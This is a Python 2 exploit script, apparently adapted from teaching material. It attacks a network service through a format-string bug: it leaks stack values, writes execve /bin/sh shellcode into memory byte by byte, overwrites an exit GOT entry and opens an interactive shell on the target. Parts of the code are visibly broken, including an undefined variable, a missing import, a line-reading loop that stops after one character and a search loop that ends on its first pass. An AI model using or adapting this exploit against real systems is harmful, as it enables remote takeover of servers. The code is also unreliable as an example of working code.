#!/usr/bin/python
# This code is adopted from exploit python written by Chris Eagle

import socket
import struct
import sys
import telnetlib

def readLine(s):
    res = None
    while True:
            ch = s.recv(1)
            if ch:
                if res is None:
                    res = ch
                else:
                    res += ch
            if ch == '\n':
                break
            else:
                break
    return res

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def writeByte(s, addr, val, idx):
    format = "%%%dc%%%d$hhn" % (val, indx + 4)
    format += "A"*(16 - len(format))
    s.send(format)

sc = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50"
sc += "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

s = socket.socket()
s.connect((sys.argv[1], int(sys.argv[2])))

s.send("AAAA %x %x %x %x %x %x %x %x %x %x %x %x\n")
if os.fork():
    while 1:
        line += s.recv(1)
#line = readLine(s)

print "%s" %line

vals = line.split()
buf_start = vals.index('41414141')
print "buffer starts at %d" % buf_start

index = buf_start + 64
while True:
    s.send("%%%d$x %%%d$x\n" % (index, index + 1))
    line = readLine(s)
    vals = line.split()
    v0 = int(vals[0], 16)
    v1 = int(vals[1], 16)
    if v0 == 1 and v1 & 0xbff00000 == 0xbff00000:
        argv = v1
    break
    index += 1

print "argv = %x" % argv

idx = 0
for b in sc:
    writeByte(s, argv + idx, ord(b), buf_start)
    readLine(s)
    idx += 1

exit = 0x0804a018
for i in range(4):
    writeByte(s, exit + i, (argv>> (8 * i)) & 0xff, buf_start)
    readLine(s)

s.send('quit\n')

interact(s)